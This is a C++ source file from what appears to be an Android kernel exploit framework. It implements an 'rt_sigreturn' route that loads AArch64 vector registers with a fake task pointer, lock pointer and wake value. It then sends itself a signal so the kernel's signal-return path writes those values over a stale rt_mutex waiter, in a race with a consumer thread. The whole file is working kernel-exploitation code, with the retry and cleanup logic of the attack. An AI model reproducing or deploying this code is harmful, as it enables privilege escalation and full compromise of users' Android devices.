#include "route/rt_sigreturn_route.h"

#include "route/rt_sigreturn_layout.h"

#include <cerrno>
#include <ctime>
#include <unistd.h>

#include <utility>

using namespace ghostlock;

namespace ghostlock::route::rt_sigreturn {
    RtSigreturnRoute::RtSigreturnRoute(
        race::PiRace *race_context, const memory::WriteRequest *route_request,
        const profile::TargetProfile &profile_value) noexcept
        : race(race_context), request(route_request), profile(profile_value) {
        status.code = ROUTE_RETRYABLE;
    }

    RtSigreturnRoute::RtSigreturnRoute(RtSigreturnRoute &&other) noexcept
        : race(other.race),
          request(other.request),
          profile(other.profile),
          old_action(other.old_action),
          old_mask(other.old_mask),
          action_installed(other.action_installed),
          mask_installed(other.mask_installed),
          consumer_stuck(other.consumer_stuck),
          calls(other.calls),
          successes(other.successes),
          stamps(other.stamps),
          stamp_result(other.stamp_result),
          stamp_errno(other.stamp_errno),
          status(other.status) {
    }

    int32_t RtSigreturnRoute::fail(int32_t step, int32_t error_number) noexcept {
        status.step = step;
        status.error_number = error_number;
        return -1;
    }

    void RtSigreturnRoute::disarm() noexcept {
        race->consumer_go.store(0);
        if (race->consumer_inflight.load() != 0) {
            for (int32_t i = 0;
                 i < 2000 && race->consumer_inflight.load() != 0;
                 i++) {
                usleep(1000);
            }
            consumer_stuck = race->consumer_inflight.load() != 0;
        }
        status.kernel_disarmed = !consumer_stuck;
    }

    void RtSigreturnRoute::destroy() noexcept {
        if (mask_installed) {
            (void) sigprocmask(SIG_SETMASK, &old_mask, nullptr);
            mask_installed = 0;
        }
        if (action_installed) {
            (void) sigaction(kStampSignalNumber, &old_action, nullptr);
            action_installed = 0;
        }
        if (consumer_stuck) {
            (void) fail(47, stamp_errno);
            status.code = ROUTE_DIRTY_FAILURE;
            /* A stuck consumer may still walk the stamped waiter; nothing here
             * owns a kernel reference to it, so only the outcome is reported. */
            return;
        }
        status.userspace_clean = 1;
        if (status.code != ROUTE_OK && status.kernel_disarmed) {
            status.code = ROUTE_FALLBACK_SAFE;
        }
    }
} // namespace ghostlock::route::rt_sigreturn

#if defined(__ANDROID__)
#include "common.h"

#include <sys/syscall.h>

#include "route/route_lifecycle.hpp"
#include "session/exploit_session.hpp"
#include "support/time.h"

namespace ghostlock::route::rt_sigreturn {
    namespace {
        /* The handler only exists so the tgkill delivery is not fatal; the
         * work happens in the kernel's rt_sigreturn path. */
        extern "C" void rt_sigreturn_stamp_handler(int32_t) noexcept {
            /* The kernel builds the rt_sigframe and rt_sigreturn copies its
             * FPSIMD save area onto the kernel stack; the handler must not touch
             * the vector state or the frame. */
        }

        /* Define every vector register that lands inside the stale waiter, then
         * raise the stamp signal on this thread. All of it happens in one asm
         * block so no compiler-generated code can clobber the vregs before the
         * syscall saves them into the signal frame:
         *   v13..v17 -> waiter 0x00..0x50 (tree / pi_tree)
         *   v18      -> waiter 0x50 task, 0x58 lock
         *   v19      -> waiter 0x60 wake_state, 0x68 ww_ctx */
        [[gnu::always_inline]] inline int32_t stamp_and_raise(
            int32_t tgid, int32_t tid, uint64_t task, uint64_t lock,
            uint64_t wake) noexcept {
            long result = 0;
            asm volatile(
                "movi v13.16b, #0\n\t"
                "movi v14.16b, #0\n\t"
                "movi v15.16b, #0\n\t"
                "movi v16.16b, #0\n\t"
                "movi v17.16b, #0\n\t"
                "ins v18.d[0], %[task]\n\t"
                "ins v18.d[1], %[lock]\n\t"
                "movi v19.16b, #0\n\t"
                "ins v19.d[0], %[wake]\n\t"
                "mov x0, %[tgid]\n\t"
                "mov x1, %[tid]\n\t"
                "mov x2, %[sig]\n\t"
                "mov x8, %[nr]\n\t"
                "svc #0\n\t"
                "mov %[result], x0\n\t"
                : [result] "=&r"(result)
                : [tgid] "r"(static_cast<long>(tgid)),
                  [tid] "r"(static_cast<long>(tid)),
                  [sig] "r"(static_cast<long>(kStampSignalNumber)),
                  [nr] "r"(static_cast<long>(131)), /* __NR_tgkill */
                  [task] "r"(task), [lock] "r"(lock), [wake] "r"(wake)
                : "x0", "x1", "x2", "x8", "memory",
                  "v13", "v14", "v15", "v16", "v17", "v18", "v19");
            return static_cast<int32_t>(result);
        }
    } // namespace

    int32_t RtSigreturnRoute::prepare() noexcept {
        const memory::PayloadPage &page = session::g_exploit_session.heap.current;
        if (!page.base || !page.fake_lock || !page.fake_fops || !page.fake_task) {
            pr_warning("rt_sigreturn route missing kernel page base=%016zx "
                       "lock=%016zx fops=%016zx task=%016zx\n",
                       static_cast<size_t>(page.base),
                       static_cast<size_t>(page.fake_lock),
                       static_cast<size_t>(page.fake_fops),
                       static_cast<size_t>(page.fake_task));
            return fail(40, 0);
        }
        struct sigaction action {};
        action.sa_handler = rt_sigreturn_stamp_handler;
        sigemptyset(&action.sa_mask);
        action.sa_flags = 0;
        if (sigaction(kStampSignalNumber, &action, &old_action) != 0) {
            return fail(41, errno);
        }
        action_installed = 1;
        sigset_t set;
        sigemptyset(&set);
        sigaddset(&set, kStampSignalNumber);
        if (sigprocmask(SIG_UNBLOCK, &set, &old_mask) != 0) {
            const int32_t error = errno;
            (void) sigaction(kStampSignalNumber, &old_action, nullptr);
            action_installed = 0;
            return fail(42, error);
        }
        mask_installed = 1;
        return 0;
    }

    route::RouteStatus RtSigreturnRoute::execute() noexcept {
        struct timespec route_t0;
        clock_gettime(CLOCK_MONOTONIC, &route_t0);

        const memory::PayloadPage &page = session::g_exploit_session.heap.current;
        if (!page.base || !page.fake_task || !page.fake_lock) {
            (void) fail(46, 0);
            status.code = ROUTE_RETRYABLE;
            return status;
        }

        race->consumer_calls.store(0);
        race->consumer_success.store(0);
        race->consumer_stop.store(0);
        const uint32_t delay_usec = profile.select_enter_delay_us();
        const uint32_t timeout_ms = profile.select_timeout_us() / 1000u;
        const int32_t max_calls =
            static_cast<int32_t>(profile.select_consumer_max_calls());
        race->route_delay_usec.store(delay_usec);
        race->consumer_go.store(1);

        const int32_t tgid = static_cast<int32_t>(getpid());
        const int32_t tid = static_cast<int32_t>(syscall(SYS_gettid));
        const uint64_t task = static_cast<uint64_t>(page.fake_task);
        const uint64_t lock = static_cast<uint64_t>(page.fake_lock);

        pr_info("rt_sigreturn pre-stamp task=%016zx lock=%016zx delay_us=%u "
                "timeout_ms=%u max_calls=%d\n",
                static_cast<size_t>(page.fake_task),
                static_cast<size_t>(page.fake_lock), delay_usec, timeout_ms,
                max_calls);

        bool done = false;
        while (!done && stamps < kRtSigreturnMaxStamps) {
            errno = 0;
            const int32_t raised =
                stamp_and_raise(tgid, tid, task, lock, kWakeStateValue);
            if (stamps == 0) {
                stamp_result = raised;
                stamp_errno = raised < 0 ? -raised : 0;
            }
            stamps++;

            if (raised != 0) {
                /* The signal never left this thread: the waiter was not stamped
                 * and retrying cannot help. */
                (void) fail(41, raised < 0 ? -raised : raised);
                done = true;
            } else if (race->consumer_success.load() > 0) {
                status.code = ROUTE_OK;
                status.step = 0;
                status.error_number = 0;
                done = true;
            } else if (max_calls > 0 &&
                       race->consumer_calls.load() >= max_calls) {
                (void) fail(43, stamp_errno);
                done = true;
            } else if (timeout_ms > 0 &&
                       runtime_time::runtime_elapsed_ms(&route_t0) >=
                           static_cast<double>(timeout_ms)) {
                (void) fail(44, ETIMEDOUT);
                done = true;
            }
        }
        if (!done) (void) fail(45, 0);
        race->consumer_go.store(0);
        calls = race->consumer_calls.load();
        successes = race->consumer_success.load();

        pr_info("rt_sigreturn post-stamp first=%d errno=%d stamps=%d calls=%d "
                "success=%d +%.0fms\n",
                stamp_result, stamp_errno, stamps, calls, successes,
                runtime_time::runtime_elapsed_ms(&route_t0));
        return status;
    }
} // namespace ghostlock::route::rt_sigreturn

namespace ghostlock::route {
    route::RouteStatus do_rt_sigreturn_fake_lock_route(
        const memory::WriteRequest *request) {
        rt_sigreturn::RtSigreturnRoute context(
            &session::g_exploit_session.race, request,
            session::g_exploit_session.profile);
        const route::RouteStatus status = run_route_lifecycle(context);
        if (context.status.code == ROUTE_DIRTY_FAILURE &&
            context.status.step == 47) {
            pr_error("rt_sigreturn consumer still inflight; route dirty\n");
        }

        pr_info("rt_sigreturn route done calls=%d success=%d stamps=%d "
                "status=%d clean=%d/%d step=%d errno=%d\n",
                context.calls, context.successes, context.stamps,
                context.status.code, context.status.userspace_clean,
                context.status.kernel_disarmed, context.status.step,
                context.status.error_number);
        return status;
    }
} // namespace ghostlock::route
#endif // __ANDROID__
